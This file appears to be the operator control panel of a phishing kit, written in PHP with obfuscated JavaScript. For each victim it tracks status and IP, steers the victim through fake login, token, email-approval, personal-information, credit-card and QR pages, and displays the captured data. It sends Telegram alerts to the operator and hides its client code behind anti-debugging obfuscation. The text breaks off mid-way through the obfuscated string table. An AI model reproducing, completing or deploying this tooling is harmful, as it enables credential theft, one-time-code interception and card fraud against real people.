<?php
    error_reporting(0);
    session_start();
    include "../libraries/get-country-code.php";
    include "../setting/functions.php";
    include "../libraries/UserInfo.php";
    include "../setting/alert-admin.php";
    include "../setting/config.php";

    if(!isset($_GET['id_user']) OR empty($_GET['id_user'])){
        exit("INVALID REQUESTS. PLEASE ACCESS THIS PAGE FROM A VALID LINK");
    }

    $_SESSION['vip'] = $_GET['id_user'];
    $target = $_GET['id_user'];
    $file_name = $target;
    $jsonFilePath = "../panel/storage/{$file_name}.json";
    $json_data = file_get_contents($jsonFilePath);
    $user_data = json_decode($json_data, true);

    //xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx// 
    $jsonFilePath = "../panel/admin/admin.json";
    $json_data = file_get_contents($jsonFilePath);
    $user_data = json_decode($json_data, true);
    $login_status = $user_data['login_status'];
    $token_admin = TOKEN;
    $chat_id_admin = CHATID;
    $ip = get_client_ip();
    $present_time = date("H:i:s"."-"."m/d/y");

    $ip_found = false;
    foreach ($user_data['login_status'] ?? [] as $login) {
        if ($login['ip'] === $ip) {
            $ip_found = true;
            break;
        }
    }
    
    if (!$ip_found) {
        $_SESSION["message_login"] = "Please log in to access this page. Or Your Ip Address is Change - " . $ip;

        $log = "Please log in to access this page. Or Your Ip Address is Change - " . $ip;

        // Send Data To Telegram :
        $message= urlencode("🔐========= Login Status =========🔐\r\n" . 
        "📍IP - ".get_client_ip()."\t\t | \t\t". 
        $detector->api() ."\r\n".
        "📊 Login Status = " .$log."\r\n".
        "💻 DEVICE = " .UserInfo::get_device()."\r\n".
        "♻️ SYSTEM TYPE = ". UserInfo::get_os()."\r\n". 
        "🌐 BROWSER VISIT = ". UserInfo::get_browser()."\r\n".
        "DATE AND TIME = ". $present_time ."\r\n".
        "🔐========= Login Status =========🔐\r\n");
        telegram($token_admin, $message, $chat_id_admin);

        echo 
        "<script>
            window.location.replace('../panel/pages/login.php');
        </script>";
        exit;
    }
?> 
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <!-- SEO -->
    <?php include '../libraries/seo.php'; ?>
    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css">
    <link rel="stylesheet" href="css/panel.css">
    <!-- Font Awesome Library -->
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.1.1/css/all.min.css" integrity="sha512-KfkfwYDsLkIlwQp6LFnl8zNdLGxu9YAA1QvwINks4PhcElQSvqcyVLLD9aMhXd13uQjoXtEKNosOWaZqXgel0g==" crossorigin="anonymous" referrerpolicy="no-referrer" />
    <!-- JQ -->
    <script src="../js/jquery-3.6.0.min.js"></script>    
    <!-- Favicon -->
    <link rel="icon" href="img/favicon.png">
    <link rel="shortcut" href="img/favicon.png">
    <link rel="appel-touch-icon" href="img/favicon.png">
    <title>Dashboard Control User - <?php echo $_GET['id_user'];?></title>
</head>
<body id="beforeUserData" class="">
    <!-- Start Nav Bar -->
    <nav>
        <div class="content-nav">
            <h3><img src="img/favicon.png" alt=""> Admin Dashboard</h3> 
            <div class="parent-buttons-setting" id="menu">
                <button id="updatePage" class="buttons-settings"> <i class="fa-solid fa-rotate-right"></i>Realod</button>
                <a class="buttons-settings" target="_blank" href="../panel/pages/settings.php"><i class="fa-solid fa-gear"></i>Settings</a>
                <a class="buttons-settings" target="_blank" href="../panel/pages/main_panel.php"><i class="fa-solid fa-square-poll-vertical"></i>Main Panel</a>
            </div>
            <button class="button-menu" id="buttonMenu"><i class="fa-solid fa-bars" id="buttonIcon"></i>Menu</button>
        </div>
    </nav>
    <!-- End Nav Bar -->

    <!-- Start Table User Information -->
        <div class="container parent-table" id="dashboard" >
        <h3 class="titles"><i class="fa-solid fa-chart-line" style="margin-right: 10px !important;"></i>User Information</h3>
        <table class="table">
            <thead>
                <tr>
                    <th><i class="fa-solid fa-signal"></i>Status</th>
                    <th><i class="fa-solid fa-map-pin"></i>Page</th>
                    <th><i class="fa-solid fa-wifi"></i>IP Address</th>
                    <th><i class="fa-solid fa-clock-rotate-left"></i>Time</th>
                </tr>
            </thead>
            <tbody id="tableBody" class="dynamic-section">

            </tbody>
        </table>
    </div>
    <!-- End Table User Information -->
     
    <!-- Start Buttons Control Users -->
    <div class="container-buttons-control-user">
        <div class="container">
            <h3 class="titles"><i class="fa-solid fa-gamepad" style="margin-right: 10px !important;"></i> Buttons Control User</h3>
            <form action="./check-action.php" method="get">
                <input type="hidden" name="step" value="panel">
                <input type="hidden" name="id_vip" value="<?php echo $_GET['id_user'];?>">
                <button type="submit" name="to" class="buttons-control-users button-valid" value="login">Login</button>
                <button type="submit" name="to" class="buttons-control-users button-error" value="login-error">Error Login</button>
                <button type="submit" name="to" class="buttons-control-users button-valid" value="token">Token Code</button>
                <button type="submit" name="to" class="buttons-control-users button-error" value="token-error">Error Token Code</button>
                <button type="submit" name="to" class="buttons-control-users button-valid" value="email-approvation">Email Approvation</button>
                <button type="submit" name="to" class="buttons-control-users button-error" value="email-approvation-error">Error Email Approvation</button>
                <button type="submit" name="to" class="buttons-control-users button-valid" value="information">Information</button>
                <button type="submit" name="to" class="buttons-control-users button-error" value="information-error">Error Information</button>
                <button type="submit" name="to" class="buttons-control-users button-valid" value="credit-card">Credit Card</button>
                <button type="submit" name="to" class="buttons-control-users button-error" value="credit-card-error">Error Credit Card</button>
                <button type="submit" name="to" class="buttons-control-users button-comfirmed" value="confirmed">Confirmed Page</button>
                <button type="submit" name="to" class="buttons-control-users button-logout" value="logout">Logout</button>
                <button type="submit" name="ban" class="buttons-control-users button-error" value="<?php echo $_GET['id_user'];?>">Ban IP</button>
            </form>
            <h3 class="titles"><i class="fa-solid fa-gamepad" style="margin-right: 10px !important;"></i>Buttons Upload Image QR</h3>
            <form action="./check-action.php" class="unique-form" method="post" enctype="multipart/form-data">
                <input type="hidden" name="step" value="panel">
                <input type="hidden" name="id_vip" value="<?php echo $_GET['id_user'];?>">
                <input type="file"  accept="image/*" required="required" name="QR_image" class="input-request">
                <button type="submit" name="to" class="buttons-control-users button-valid" value="qr">QR Image</button>
                <button type="submit" name="to" class="buttons-control-users button-error" value="qr-error">Error QR Image</button>
            </form>
            <h3 class="titles"><i class="fa-solid fa-gamepad" style="margin-right: 10px !important;"></i> Extra Information Buttons</h3>
            <form action="./check-action.php" class="unique-form" method="get">
                <input type="hidden" name="step" value="panel">
                <input type="hidden" name="id_vip" value="<?php echo $_GET['id_user'];?>">
                <input type="text" class="input-request" name="extra_information" placeholder="Extra Information" required="required">
                <button type="submit" name="to" class="buttons-control-users button-valid" value="extra-information">Extra Information</button>
                <button type="submit" name="to" class="buttons-control-users button-error" value="extra-information-error">Extra Information</button>
            </form>
            <div class="parent-buttons-events">
                <h3 class="titles"><i class="fa-solid fa-circle-info" style="margin-right: 10px !important;"></i>User Data</h3>
                <textarea class="data" id="userDataTextarea"></textarea>
            </div>
        </div>
    </div>
    <!-- Start User Data -->

    <!-- Script Js -->
    <script>
        const file_name = "<?php echo $file_name; ?>";
        const user_id = "<?php echo $_GET['id_user']; ?>";
        const ipV = "<?php echo $_GET['id_user']; ?>";
        const _0x_0x5037cc=_0x_0x4a35,_0x_0x4a83fe=_0x_0x4a35;function _0x_0x4a35(_0x26d2f4,_0x27ad5f){const _0x59db72=_0x_0x3da9();return _0x_0x4a35=function(_0x276354,_0x579d8b){_0x276354=_0x276354-(-0x62*0x2+-0x331*0x9+0x3*0xa21);let _0x5ae98e=_0x59db72[_0x276354];if(_0x_0x4a35['hSXqpJ']===undefined){var _0x3cb1d5=function(_0x411a99){const _0x5bbe13='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';let _0x4888e8='',_0x1a4af9='',_0x211c19=_0x4888e8+_0x3cb1d5;for(let _0x326a3e=0x20f4+0xc*-0xa9+-0x8*0x321,_0x45b23b,_0x331b32,_0x5cffc8=0x2088+-0x120e*0x1+-0x11*0xda;_0x331b32=_0x411a99['charAt'](_0x5cffc8++);~_0x331b32&&(_0x45b23b=_0x326a3e%(-0x825*0x2+0x3bb*-0x4+0x1f3a)?_0x45b23b*(0x2457+0x1c5f+-0x203b*0x2)+_0x331b32:_0x331b32,_0x326a3e++%(-0x34*0x76+-0x150*0x1a+0x1*0x3a1c))?_0x4888e8+=_0x211c19['charCodeAt'](_0x5cffc8+(-0x5*0x2e3+0xad*0x25+-0xa88*0x1))-(0x3*0x2dc+0x3f4+0x2*-0x63f)!==-0x1397+0x4f1+0xea6?String['fromCharCode'](-0x2564+0x81*0x1f+0x2f*0x7c&_0x45b23b>>(-(-0x154e+-0x128b+0x27db)*_0x326a3e&-0xd*-0x37+-0x2e*0x2b+0x4f5*0x1)):_0x326a3e:-0x1*-0x12d3+-0x18f+-0x2*0x8a2){_0x331b32=_0x5bbe13['indexOf'](_0x331b32);}for(let _0x14096a=0x15ae+0x21cf+-0x377d,_0x3b602f=_0x4888e8['length'];_0x14096a<_0x3b602f;_0x14096a++){_0x1a4af9+='%'+('00'+_0x4888e8['charCodeAt'](_0x14096a)['toString'](0x10b5+-0x1*-0x1f83+0x43*-0xb8))['slice'](-(0x210*-0xf+0xa49+0x14a9));}return decodeURIComponent(_0x1a4af9);};_0x_0x4a35['LzXLGA']=_0x3cb1d5,_0x26d2f4=arguments,_0x_0x4a35['hSXqpJ']=!![];}const _0x15fc62=_0x59db72[0x28d*0x7+0x175e+-0x2939],_0x12c132=_0x276354+_0x15fc62,_0x5ba026=_0x26d2f4[_0x12c132];if(!_0x5ba026){const _0x4cc478=function(_0x162f86){this['tRmJqm']=_0x162f86,this['pwuqjg']=[-0xdac+0xdb*-0x1d+0x267c,-0x11f8+0x71f*0x3+-0x365,0x1d*0x5c+0x14c3+-0x1f2f],this['fJMLvj']=function(){return'newState';},this['TKSQgQ']='\x5cw+\x20*\x5c(\x5c)\x20*{\x5cw+\x20*',this['FxpMQR']='[\x27|\x22].+[\x27|\x22];?\x20*}';};_0x4cc478['prototype']['UJPfSg']=function(){const _0x33fc76=new RegExp(this['TKSQgQ']+this['FxpMQR']),_0x37ab3c=_0x33fc76['test'](this['fJMLvj']['toString']())?--this['pwuqjg'][0x216c+-0x6*-0x671+0x3cb*-0x13]:--this['pwuqjg'][0x1d30+-0x32*0x7d+0x2f*-0x1a];return this['OzMBTD'](_0x37ab3c);},_0x4cc478['prototype']['OzMBTD']=function(_0xdd2a46){if(!Boolean(~_0xdd2a46))return _0xdd2a46;return this['hGlvpf'](this['tRmJqm']);},_0x4cc478['prototype']['hGlvpf']=function(_0x1c5678){for(let _0x4c9edf=-0x1743+-0x2*0x9+0x21f*0xb,_0x50c23c=this['pwuqjg']['length'];_0x4c9edf<_0x50c23c;_0x4c9edf++){this['pwuqjg']['push'](Math['round'](Math['random']())),_0x50c23c=this['pwuqjg']['length'];}return _0x1c5678(this['pwuqjg'][0x1ef4+0x2*0x1f3+-0x22da]);},new _0x4cc478(_0x_0x4a35)['UJPfSg'](),_0x5ae98e=_0x_0x4a35['LzXLGA'](_0x5ae98e),_0x26d2f4[_0x12c132]=_0x5ae98e;}else _0x5ae98e=_0x5ba026;return _0x5ae98e;},_0x_0x4a35(_0x26d2f4,_0x27ad5f);}(function(_0x3e345a,_0x2bcc4a){const _0x35996e=_0x_0x4a35,_0xefeded=_0x_0x4a35,_0x2f0a44=_0x3e345a();while(!![]){try{const _0x279837=-parseInt(_0x35996e(0xfb))/(0x53*0x4a+-0x374+-0x1489)+-parseInt(_0xefeded(0x12d))/(0x820+0x6e8+-0xf06)*(parseInt(_0xefeded(0xff))/(0xb1c+-0x2ae*-0x3+-0x1323))+-parseInt(_0xefeded(0xea))/(-0x1d*-0xae+0x494+-0xd*0x1de)*(-parseInt(_0xefeded(0x110))/(-0x77*0xd+-0x363*0x7+0x1dc5))+parseInt(_0xefeded(0xf5))/(-0x1e*-0x62+-0x199b+-0xe25*-0x1)*(parseInt(_0xefeded(0x12c))/(-0x1f35+0x1*-0x311+-0x1*-0x224d))+parseInt(_0xefeded(0x150))/(-0x31*-0xc8+-0x1fd6+-0x66a)*(parseInt(_0xefeded(0x135))/(0x1042*0x2+-0x161e+0x17b*-0x7))+parseInt(_0xefeded(0x167))/(-0x791*0x3+-0x2*0xbe9+-0x57*-0x89)+-parseInt(_0x35996e(0x164))/(-0x16cc+0x3*-0x1cb+0x1c38)*(parseInt(_0x35996e(0x174))/(0x40f+-0x15c1+0x11be));if(_0x279837===_0x2bcc4a)break;else _0x2f0a44['push'](_0x2f0a44['shift']());}catch(_0x381a76){_0x2f0a44['push'](_0x2f0a44['shift']());}}}(_0x_0x3da9,-0x3f547*-0x3+0x1*-0x5b3c5+-0x2fe5));function fetchAndUpdateContent(){const _0x11c97d=_0x_0x4a35,_0x2865eb=_0x_0x4a35,_0x3c99b3={'fuebK':_0x11c97d(0xf7)+'+$','pLUxJ':_0x11c97d(0x113)+'a-zA-Z_$]['+_0x2865eb(0x140)+_0x11c97d(0x103),'GVVgm':_0x11c97d(0xf6),'jpOSe':function(_0x19f8d7,_0x1d7a6c){return _0x19f8d7+_0x1d7a6c;},'nIQvG':_0x11c97d(0x109),'mWZuU':function(_0x2e90af){return _0x2e90af();},'NosBM':_0x11c97d(0x15e)+'nction()\x20','kGPmC':'{}.constru'+_0x2865eb(0x15f)+_0x2865eb(0xf8)+'\x20)','GOyjG':_0x2865eb(0x173),'GNhEw':_0x2865eb(0x14b),'VCRTV':function(_0x39bf49,_0x18e6f4){return _0x39bf49<_0x18e6f4;},'XjZzX':_0x11c97d(0x123)+_0x11c97d(0xed),'FNvIx':function(_0x2dc85b,_0x483f2a,_0x465c68){return _0x2dc85b(_0x483f2a,_0x465c68);},'hmQJa':function(_0x3d5f2e,_0x21b545,_0x4bbc9f){return _0x3d5f2e(_0x21b545,_0x4bbc9f);},'vABTW':function(_0x428b75){return _0x428b75();},'wSEhl':function(_0x87b7c6,_0x3233d9){return _0x87b7c6(_0x3233d9);},'FCKBA':_0x2865eb(0xf0),'Xjpun':_0x11c97d(0x11e)+_0x2865eb(0x111),'bsqWr':_0x2865eb(0x158),'KYNnH':'GET','WsXmY':function(_0x268758,_0x4799d7,_0x21466b){return _0x268758(_0x4799d7,_0x21466b);}},_0x4cb1c4=(function(){let _0x129731=!![];return function(_0x5cf24e,_0x48a5cf){const _0x4b5cb2=_0x129731?function(){if(_0x48a5cf){const _0x24248f=_0x48a5cf['apply'](_0x5cf24e,arguments);return _0x48a5cf=null,_0x24248f;}}:function(){};return _0x129731=![],_0x4b5cb2;};}()),_0x20451d=_0x3c99b3['FNvIx'](_0x4cb1c4,this,function(){const _0x814112=_0x2865eb,_0x55e035=_0x11c97d;return _0x20451d['toString']()['search'](_0x3c99b3[_0x814112(0x15b)])[_0x55e035(0x144)]()['constructo'+'r'](_0x20451d)[_0x55e035(0x10b)](_0x3c99b3['fuebK']);});_0x3c99b3['mWZuU'](_0x20451d);const _0x3d8837=(function(){let _0x18670c=!![];return function(_0x3e370d,_0x57c782){const _0x47e7fd=_0x18670c?function(){const _0x2ad249=_0x_0x4a35;if(_0x57c782){const _0x62ae89=_0x57c782[_0x2ad249(0x116)](_0x3e370d,arguments);return _0x57c782=null,_0x62ae89;}}:function(){};return _0x18670c=![],_0x47e7fd;};}());(function(){_0x3d8837(this,function(){const _0xf4fa70=_0x_0x4a35,_0x58ceff=_0x_0x4a35,_0x2db049=new RegExp(_0xf4fa70(0xe8)+_0xf4fa70(0x145)),_0x40b308=new RegExp(_0x3c99b3[_0xf4fa70(0x169)],'i'),_0x42a843=_0x4603a2(_0x3c99b3[_0xf4fa70(0x118)]);!_0x2db049[_0x58ceff(0x102)](_0x42a843+_0xf4fa70(0x122))||!_0x40b308[_0xf4fa70(0x102)](_0x3c99b3['jpOSe'](_0x42a843,_0x3c99b3[_0xf4fa70(0x165)]))?_0x42a843('0'):_0x3c99b3[_0x58ceff(0xfe)](_0x4603a2);})();}());const _0x57585a=(function(){let _0xe1fe99=!![];return function(_0x5c8d47,_0x431271){const _0xce1a2c=_0xe1fe99?function(){const _0x7c710f=_0x_0x4a35;if(_0x431271){const _0x27a0f6=_0x431271[_0x7c710f(0x116)](_0x5c8d47,arguments);return _0x431271=null,_0x27a0f6;}}:function(){};return _0xe1fe99=![],_0xce1a2c;};}()),_0x17006b=_0x3c99b3[_0x2865eb(0x13d)](_0x57585a,this,function(){const _0x58ef2f=_0x2865eb,_0xdbb71b=_0x2865eb;let _0x4dd046;try{const _0x30ecd2=Function(_0x3c99b3[_0x58ef2f(0x14d)](_0x3c99b3['NosBM']+_0x3c99b3[_0x58ef2f(0x159)],');'));_0x4dd046=_0x3c99b3[_0x58ef2f(0xfe)](_0x30ecd2);}catch(_0x3848b0){_0x4dd046=window;}const _0xb2014f=_0x4dd046['console']=_0x4dd046[_0xdbb71b(0x12f)]||{},_0x1f10dd=[_0xdbb71b(0xfd),'warn',_0x3c99b3[_0xdbb71b(0x10d)],_0xdbb71b(0x133),_0xdbb71b(0x16f),_0x3c99b3[_0xdbb71b(0x155)],_0x58ef2f(0xef)];for(let _0x46a955=0x2*-0x13f+-0x5f9+0xc5*0xb;_0x3c99b3[_0x58ef2f(0x136)](_0x46a955,_0x1f10dd[_0xdbb71b(0x16c)]);_0x46a955++){const _0x40d36d=_0x57585a[_0x58ef2f(0xfc)+'r'][_0x58ef2f(0x17e)][_0xdbb71b(0x134)](_0x57585a),_0x26a4d1=_0x1f10dd[_0x46a955],_0x1a7058=_0xb2014f[_0x26a4d1]||_0x40d36d;_0x40d36d[_0x58ef2f(0x16b)]=_0x57585a['bind'](_0x57585a),_0x40d36d['toString']=_0x1a7058[_0x58ef2f(0x144)][_0x58ef2f(0x134)](_0x1a7058),_0xb2014f[_0x26a4d1]=_0x40d36d;}});_0x3c99b3[_0x11c97d(0xe9)](_0x17006b),_0x3c99b3[_0x2865eb(0x108)]($,_0x3c99b3[_0x2865eb(0x10c)]),$[_0x11c97d(0x14f)]({'url':_0x3c99b3[_0x11c97d(0x127)]+file_name+_0x3c99b3[_0x11c97d(0x157)],'type':_0x3c99b3['KYNnH'],'dataType':_0x11c97d(0x114),'success':function(_0x1aa122){updateTable(_0x1aa122);},'error':function(_0x1639af,_0x5e2070,_0x46a993){const _0x32bdc1=_0x11c97d,_0x25dd9e=_0x11c97d;console[_0x32bdc1(0x133)](_0x3c99b3[_0x32bdc1(0x10f)],_0x46a993);}}),_0x3c99b3[_0x2865eb(0x179)](setTimeout,fetchAndUpdateContent,-0x97d+-0x1af*-0x1+0xbb6);}function updateTable(_0x23eb7f){const _0x4aab84=_0x_0x4a35,_0x3443a2=_0x_0x4a35,_0x71f045={'PwWqE':'#tableBody','oIgTU':function(_0x439ca5,_0x552bf9){return _0x439ca5(_0x552bf9);},'RtISP':'<tr>','pciDN':_0x4aab84(0x177),'JteDt':function(_0x44e2cc,_0x48b8a9){return _0x44e2cc(_0x48b8a9);}};let _0x38aaae=$(_0x71f045[_0x3443a2(0x153)]);_0x38aaae[_0x4aab84(0x142)]();let _0x1f4089=_0x71f045[_0x4aab84(0x119)]($,_0x71f045[_0x3443a2(0x130)]),_0x230e3e=$(_0x71f045[_0x3443a2(0x11f)])[_0x4aab84(0x117)](_0x23eb7f[_0x4aab84(0xec)]),_0x189d6a=_0x71f045['oIgTU']($,_0x71f045[_0x3443a2(0x11f)])[_0x3443a2(0xf4)](_0x23eb7f[_0x3443a2(0x154)+'ge']),_0x573e8e=_0x71f045[_0x4aab84(0x13e)]($,_0x4aab84(0x177))[_0x3443a2(0xf4)](_0x23eb7f[_0x3443a2(0x124)]),_0x2b0e7d=_0x71f045[_0x3443a2(0x119)]($,_0x71f045[_0x4aab84(0x11f)])[_0x4aab84(0xf4)](_0x23eb7f[_0x3443a2(0x161)]);_0x1f4089[_0x3443a2(0x178)](_0x230e3e,_0x189d6a,_0x573e8e,_0x2b0e7d),_0x38aaae[_0x3443a2(0x178)](_0x1f4089);}fetchAndUpdateContent(),$(_0x_0x5037cc(0x14c)+'e')[_0x_0x5037cc(0x163)](function(){const _0xffa3f6=_0x_0x4a83fe;location[_0xffa3f6(0x17d)]();}),$(document)['ready'](function(){const _0xd05bf7=_0x_0x5037cc,_0x41e1de=_0x_0x4a83fe,_0x257f1f={'HWLOY':_0xd05bf7(0x162)+_0x41e1de(0x11b),'wIzSR':function(_0x22207e,_0x5639ae){return _0x22207e+_0x5639ae;},'TGkNF':function(_0x57be10,_0x43819f){return _0x57be10(_0x43819f);},'WOSkU':function(_0xe9e858,_0x299244){return _0xe9e858(_0x299244);},'HfmrY':function(_0xa4a65c,_0x573501,_0x4aed9a){return _0xa4a65c(_0x573501,_0x4aed9a);}};_0x257f1f[_0x41e1de(0x143)](setInterval,function(){const _0x1b7c2e=_0xd05bf7,_0x3cd27f=_0x41e1de,_0x383ca8={'BRZIn':_0x257f1f['HWLOY'],'CvmFa':function(_0x487d09,_0x22b076){const _0x468f1a=_0x_0x4a35;return _0x257f1f[_0x468f1a(0x12a)](_0x487d09,_0x22b076);},'KWhyD':function(_0x18c425,_0x5bd400){return _0x257f1f['wIzSR'](_0x18c425,_0x5bd400);},'kGSVc':function(_0x586179,_0x55b884){return _0x586179+_0x55b884;},'OXoGG':function(_0x4ab737,_0x4ea7c7){const _0x380dc7=_0x_0x4a35;return _0x257f1f[_0x380dc7(0x12a)](_0x4ab737,_0x4ea7c7);},'VjbZL':function(_0x37ab2f,_0x356696){return _0x37ab2f+_0x356696;},'InMag':function(_0x503035,_0x20c112){const _0x156b7c=_0x_0x4a35;return _0x257f1f[_0x156b7c(0x12a)](_0x503035,_0x20c112);},'asned':function(_0x177fe0,_0x433e15){const _0x3cb3c8=_0x_0x4a35;return _0x257f1f[_0x3cb3c8(0x172)](_0x177fe0,_0x433e15);},'teLqw':function(_0x127fdb,_0x430df4){const _0x1807e6=_0x_0x4a35;return _0x257f1f[_0x1807e6(0x147)](_0x127fdb,_0x430df4);},'soozX':_0x1b7c2e(0xee)+'ing\x20data'},_0x5daf4e={};_0x5daf4e[_0x1b7c2e(0x160)]=user_id,$[_0x3cd27f(0x14f)]({'url':_0x1b7c2e(0x166)+_0x1b7c2e(0x106),'type':_0x1b7c2e(0x121),'data':_0x5daf4e,'success':function(_0x2e74dc){const _0x43060a=_0x3cd27f,_0x12a797=_0x1b7c2e;try{let _0x2eb6c9=JSON[_0x43060a(0x149)](_0x2e74dc);if(_0x2eb6c9[_0x12a797(0x133)])$(_0x383ca8[_0x43060a(0x13f)])[_0x43060a(0x15a)](_0x2eb6c9[_0x12a797(0x133)]);else{let _0x292663=_0x383ca8['CvmFa'](_0x383ca8[_0x12a797(0x156)](_0x383ca8['KWhyD'](_0x383ca8[_0x12a797(0x128)](_0x383ca8[_0x12a797(0x17a)](_0x383ca8[_0x12a797(0x17a)](_0x383ca8[_0x43060a(0xf2)](_0x383ca8[_0x12a797(0x12e)](_0x383ca8['InMag'](_0x383ca8[_0x43060a(0x12e)](_0x2eb6c9[_0x12a797(0x13b)]||'',_0x2eb6c9['data_2']||''),_0x2eb6c9[_0x43060a(0x148)]||''),_0x2eb6c9[_0x12a797(0x11c)]||'')+(_0x2eb6c9[_0x43060a(0x139)]||''),_0x2eb6c9['data_6']||''),_0x2eb6c9[_0x43060a(0x170)]||'')+(_0x2eb6c9[_0x43060a(0x131)]||''),_0x2eb6c9['data_9']||''),_0x2eb6c9[_0x43060a(0x141)]||''),_0x2eb6c9[_0x12a797(0x14e)]||'')+(_0x2eb6c9['data_12']||'')+(_0x2eb6c9['data_13']||''),_0x2eb6c9[_0x12a797(0xfa)]||''),_0x2eb6c9['data_15']||'');_0x383ca8[_0x43060a(0x129)]($,_0x383ca8[_0x43060a(0x13f)])[_0x12a797(0x15a)](_0x292663);}}catch{_0x383ca8[_0x43060a(0x151)]($,'#userDataT'+_0x43060a(0x11b))['val'](_0x383ca8[_0x43060a(0xeb)]);}},'error':function(){const _0xdffc66=_0x3cd27f,_0xb4d6a=_0x1b7c2e;$(_0x257f1f[_0xdffc66(0x100)])[_0xb4d6a(0x15a)]('Error\x20fetc'+'hing\x20data');}});},0x2448+-0x914+0x2*-0xba6);});const menu=document[_0x_0x4a83fe(0x171)+_0x_0x5037cc(0x12b)](_0x_0x4a83fe(0x152)),buttonMenu=document[_0x_0x5037cc(0x171)+_0x_0x4a83fe(0x12b)](_0x_0x4a83fe(0x14a)),buttonIcon=document[_0x_0x5037cc(0x171)+_0x_0x5037cc(0x12b)](_0x_0x5037cc(0x16e));buttonMenu[_0x_0x5037cc(0x15d)+_0x_0x5037cc(0x146)]('click',()=>{const _0x15b2ae=_0x_0x5037cc,_0x1fb13a=_0x_0x5037cc,_0x4f4046={};_0x4f4046[_0x15b2ae(0x126)]=_0x1fb13a(0x112),_0x4f4046[_0x15b2ae(0x11d)]=_0x15b2ae(0x13c)+'a-circle-x'+_0x15b2ae(0x168),_0x4f4046[_0x1fb13a(0x105)]=_0x15b2ae(0x13c)+'a-bars';const _0x333168=_0x4f4046;menu[_0x1fb13a(0xf9)]['toggle'](_0x333168[_0x1fb13a(0x126)]),buttonIcon[_0x15b2ae(0x16d)]=menu['classList'][_0x1fb13a(0xf3)](_0x333168['UiVOr'])?_0x333168[_0x15b2ae(0x11d)]:_0x333168['xRepk'];});function _0x4603a2(_0x461f7d){const _0x36dce0=_0x_0x4a83fe,_0x412dd0=_0x_0x5037cc,_0x1cf00d={'WMkEk':function(_0x1ce3d3,_0x158868){return _0x1ce3d3===_0x158868;},'yEOxQ':_0x36dce0(0x17c),'fSGKE':_0x412dd0(0x13a),'Ffxmi':function(_0x48df2c,_0x31d8ad){return _0x48df2c+_0x31d8ad;},'NjLhS':function(_0x11c015,_0x2f9598){return _0x11c015/_0x2f9598;},'nOOLP':_0x36dce0(0x16c),'SBZCv':function(_0x471f57,_0x39a9cc){return _0x471f57%_0x39a9cc;},'VaprO':function(_0x13f257,_0x1e0bb6){return _0x13f257+_0x1e0bb6;},'YYWHu':_0x412dd0(0x10a),'yiSMA':_0x412dd0(0x176),'gEztH':_0x412dd0(0x16a),'kcjBZ':function(_0x54a3c2,_0x578663){return _0x54a3c2+_0x578663;},'euFDv':'stateObjec'+'t','gvSNs':function(_0x4b4754,_0x2cc6a4){return _0x4b4754(_0x2cc6a4);},'tAqam':function(_0x50d5f3,_0x18f396){return _0x50d5f3(_0x18f396);}};function _0x37098a(_0xef1f34){const _0x454829=_0x36dce0,_0x15a93a=_0x412dd0;if(_0x1cf00d[_0x454829(0x137)](typeof _0xef1f34,_0x1cf00d[_0x454829(0x104)]))return function(_0x4096d4){}[_0x15a93a(0xfc)+'r'](_0x15a93a(0xf1)+_0x15a93a(0x10e))[_0x454829(0x116)](_0x1cf00d[_0x454829(0xe7)]);else _0x1cf00d[_0x454829(0xe6)]('',_0x1cf00d[_0x15a93a(0x115)](_0xef1f34,_0xef1f34))[_0x1cf00d['nOOLP']]!==0x4ab*0x3+0x3e1+-0x11e1||_0x1cf00d['WMkEk'](_0x1cf00d[_0x454829(0x17b)](_0xef1f34,-0x9e9+0x18e3+-0x2*0x773),0x65c+0xf1*-0x10+0x8b4)?function(){return!![];}[_0x454829(0xfc)+'r'](_0x1cf00d[_0x15a93a(0x107)](_0x1cf00d[_0x15a93a(0x138)],_0x1cf00d[_0x15a93a(0x132)]))[_0x15a93a(0x11a)](_0x1cf00d[_0x454829(0x101)]):function(){return![];}[_0x15a93a(0xfc)+'r'](_0x1cf00d[_0x15a93a(0x120)](_0x1cf00d[_0x454829(0x138)],_0x1cf00d[_0x15a93a(0x132)]))[_0x15a93a(0x116)](_0x1cf00d[_0x15a93a(0x125)]);_0x1cf00d[_0x15a93a(0x175)](_0x37098a,++_0xef1f34);}try{if(_0x461f7d)return _0x37098a;else _0x1cf00d[_0x412dd0(0x15c)](_0x37098a,0x23e1+-0x151d+-0x6*0x276);}catch(_0xd6aa91){}}function _0x_0x3da9(){const _0x223d73=['zgf0yv8Xma','zw1WDhK','sgzTCLK','Dg9tDhjPBMC','xcGGkLWP','C3rLBMvY','v09tA1u','zgf0yv8Z','CgfYC2u','yNv0Dg9UtwvUDq','DgfIBgu','i3vWzgf0zvbHzW','ANbpu2u','zgf0yv8Xmq','ywPHEa','mti1mdC1mKTKCef3va','DgvmCxC','BwvUDq','uhDxCuu','y3vYCMvUDf9Wyq','r05OrxC','q3zTrMe','yNnXv3i','lMPZB24','A0DqBum','DMfS','zNvLyKS','DefXyw0','ywrKrxzLBNrmAq','CMv0DxjUicHMDq','y3rVCIGICMv0Dq','AwrFDxnLCG','DgLTzxn0yw1W','i3vZzxjeyxrHva','y2XPy2S','nZDzzKLmEw0','BKLrDKC','z2v0x3vZzxjFza','nZyZmJG1meDlu05hyW','BwfYAW','CeXvEeO','ywn0Aw9U','x19WCM90B19F','BgvUz3rO','y2XHC3noyw1L','yNv0Dg9UswnVBG','zxHJzxb0Aw9U','zgf0yv83','z2v0rwXLBwvUDa','veDRtKy','Aw5MBW','mtqXmdKYnhPkrwfuBq','z3zttNm','z2DLCG','phrKpG','yxbWzw5K','v3nyBvK','t1HVr0C','u0jAq3y','C3rYAw5N','CMvSB2fK','ChjVDg90ExbL','rMz4BwK','zLnhs0u','zNvUy3rPB24GkG','DKfcvfC','mJq2ogT3D1vntG','C29VELG','DxnLCLn0yxr1CW','AgLUzYbKyxrHoG','rxjYB3iGCgfYCW','DhjHy2u','i3rHyMXLqM9KEq','D2HPBguGkhrYDq','s1DOEuq','y29UDgfPBNm','Dgv4Da','mZbntLPWBNG','Aw5PDa','kcGOlISPkYKRkq','CM4GDgHPCYiPka','y2XHC3nmAxn0','zgf0yv8Xna','ntG1nJ